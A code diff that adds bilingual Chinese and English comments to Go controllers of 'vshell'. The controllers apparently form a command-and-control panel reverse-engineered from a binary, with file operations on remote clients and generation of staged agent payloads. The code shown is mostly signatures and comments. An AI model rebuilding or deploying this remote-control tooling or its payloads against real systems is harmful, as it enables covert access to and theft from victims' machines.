@@ -1,3 +1,8 @@
+// Package controllers/file 实现在远程客户端上的文件管理（列表/删除/移动/读取/上传/下载）
+// 以及服务端文件与 Agent 二进制的下载。
+// Package controllers/file implements file management on remote clients
+// (list/delete/move/read/upload/download) plus server-side file and agent
+// binary downloads.
 package controllers
 
 import (
@@ -18,13 +23,15 @@ import (
 	"vshell/models"
 )
 
-// FileController handles file system operations on clients
+// FileController 处理客户端上的文件系统操作。
+// FileController handles file system operations on clients.
 // (reverse-engineered from nTApp6jPzv.FileController)
 type FileController struct {
 	BaseController
 }
 
-// Get lists files (dir listing) — for now, server-side listing
+// Get 列出文件（目录列表，当前为服务端侧列表）。
+// Get lists files (dir listing) — for now, server-side listing.
 func (c *FileController) Get() {
 	path := c.GetString("path", ".")
 	entries, err := os.ReadDir(path)
@@ -59,7 +66,8 @@ func (c *FileController) Get() {
 	c.JSONOk(files)
 }
 
-// Ls lists files on a remote client (matching original binary FileController.Ls)
+// Ls 列出远程客户端上的文件（对应原版 FileController.Ls）。
+// Ls lists files on a remote client (matching original binary FileController.Ls).
 func (c *FileController) Ls() {
 	clientID, _ := c.GetInt64("client_id")
 	path := c.GetString("path", ".")
@@ -85,7 +93,8 @@ func (c *FileController) Ls() {
 	})
 }
 
-// Rm removes a file on a remote client (matching FileController.Rm)
+// Rm 删除远程客户端上的文件（对应 FileController.Rm）。
+// Rm removes a file on a remote client (matching FileController.Rm).
 func (c *FileController) Rm() {
 	clientID, _ := c.GetInt64("client_id")
 	path := c.GetString("path")
@@ -116,7 +125,8 @@ func (c *FileController) Rm() {
 	})
 }
 
-// Mv moves/renames a file on a remote client (matching FileController.Mv)
+// Mv 移动/重命名远程客户端上的文件（对应 FileController.Mv）。
+// Mv moves/renames a file on a remote client (matching FileController.Mv).
 func (c *FileController) Mv() {
 	clientID, _ := c.GetInt64("client_id")
 	src := c.GetString("src")
@@ -148,7 +158,8 @@ func (c *FileController) Mv() {
 	})
 }
 
-// Cat reads a file from a remote client (matching FileController.Cat)
+// Cat 从远程客户端读取文件（对应 FileController.Cat）。
+// Cat reads a file from a remote client (matching FileController.Cat).
 func (c *FileController) Cat() {
 	clientID, _ := c.GetInt64("client_id")
 	path := c.GetString("path")
@@ -178,7 +189,8 @@ func (c *FileController) Cat() {
 	})
 }
 
-// Mkdir creates a directory on a remote client (matching FileController.Mkdir)
+// Mkdir 在远程客户端创建目录（对应 FileController.Mkdir）。
+// Mkdir creates a directory on a remote client (matching FileController.Mkdir).
 func (c *FileController) Mkdir() {
 	clientID, _ := c.GetInt64("client_id")
 	path := c.GetString("path")
@@ -204,7 +216,8 @@ func (c *FileController) Mkdir() {
 	})
 }
 
-// Touch creates an empty file on a remote client (matching FileController.Touch)
+// Touch 在远程客户端创建空文件（对应 FileController.Touch）。
+// Touch creates an empty file on a remote client (matching FileController.Touch).
 func (c *FileController) Touch() {
 	clientID, _ := c.GetInt64("client_id")
 	path := c.GetString("path")
@@ -230,7 +243,8 @@ func (c *FileController) Touch() {
 	})
 }
 
-// Getdisk gets disk information from a remote client (matching FileController.Getdisk)
+// Getdisk 从远程客户端获取磁盘信息（对应 FileController.Getdisk）。
+// Getdisk gets disk information from a remote client (matching FileController.Getdisk).
 func (c *FileController) Getdisk() {
 	clientID, _ := c.GetInt64("client_id")
 
@@ -257,7 +271,8 @@ func (c *FileController) Getdisk() {
 	})
 }
 
-// Post handles file upload to server
+// Post 处理向服务器的文件上传。
+// Post handles file upload to server.
 func (c *FileController) Post() {
 	// Try multipart upload first
 	if err := c.Ctx.Request.ParseMultipartForm(32 << 20); err != nil {
@@ -301,7 +316,8 @@ func (c *FileController) Post() {
 	})
 }
 
-// Upload uploads a file to a remote client (matching FileController.Upload)
+// Upload 向远程客户端上传文件（对应 FileController.Upload）。
+// Upload uploads a file to a remote client (matching FileController.Upload).
 func (c *FileController) Upload() {
 	clientID, _ := c.GetInt64("client_id")
 	remotePath := c.GetString("remote_path")
@@ -345,7 +361,8 @@ func (c *FileController) Upload() {
 	})
 }
 
-// Delete handles file deletion on server
+// Delete 处理服务器上的文件删除。
+// Delete handles file deletion on server.
 func (c *FileController) Delete() {
 	path := c.GetString("path")
 	if path == "" {
@@ -369,7 +386,8 @@ func (c *FileController) Delete() {
 	c.JSONOk(map[string]string{"message": "deleted"})
 }
 
-// Download downloads a file from server
+// Download 从服务器下载文件。
+// Download downloads a file from server.
 func (c *FileController) Download() {
 	path := c.GetString("path")
 	if path == "" {
@@ -389,16 +407,19 @@ func (c *FileController) Download() {
 }
 
 // ============================================================================
-// DownloadController - Agent binary generation and download
+// DownloadController - Agent 二进制生成与下载。
+// DownloadController - Agent binary generation and download.
 // (reverse-engineered from nTApp6jPzv.DownloadController)
 // ============================================================================
 
-// DownloadController handles server-side file downloads and agent binary generation
+// DownloadController 处理服务端文件下载与 Agent 二进制生成。
+// DownloadController handles server-side file downloads and agent binary generation.
 type DownloadController struct {
 	BaseController
 }
 
-// Get downloads a file from the server (query param path)
+// Get 从服务器下载文件（query 参数 path）。
+// Get downloads a file from the server (query param path).
 func (c *DownloadController) Get() {
 	path := c.GetString("path")
 	if path == "" {
@@ -417,6 +438,7 @@ func (c *DownloadController) Get() {
 	http.ServeFile(c.Ctx.ResponseWriter, c.Ctx.Request, cleanPath)
 }
 
+// Stage 生成并提供分阶段（staged）Agent 载荷（对应 DownloadController.Stage）。
 // Stage generates and serves a staged agent payload (matching DownloadController.Stage).
 // Original binary restriction (black-box): "Stage support TCP/WS only".
 func (c *DownloadController) Stage() {
